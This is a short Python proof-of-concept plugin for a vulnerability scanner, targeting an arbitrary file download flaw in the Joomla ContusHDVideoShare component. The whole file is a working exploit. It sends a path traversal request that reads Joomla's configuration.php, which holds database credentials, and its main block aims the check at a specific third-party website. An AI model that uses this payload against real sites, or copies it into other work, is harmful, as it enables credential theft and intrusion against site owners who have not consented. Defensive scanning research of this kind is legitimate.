from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
"""
Joomla ContusHDVideoShare com_contushdvideoshare - Arbitrary File Download Vulnerability
http://cn.1337day.com/exploit/23186
"""

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payload = 'components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php'
        url = arg + payload
        code, head, res, errcode, _ = curl.curl(url)
        if code == 200 and 'class JConfig' in res:#the joomla configuration.php contain the words "class JConfig"
             output(url,result,'warning')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  joomla  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='joomla Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/joomla/joomla_e6e168b28708db8756f8221e052ee8fc.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/joomla/joomla_e6e168b28708db8756f8221e052ee8fc.py
#/root/github/poccreate/codesrc/exp-613.py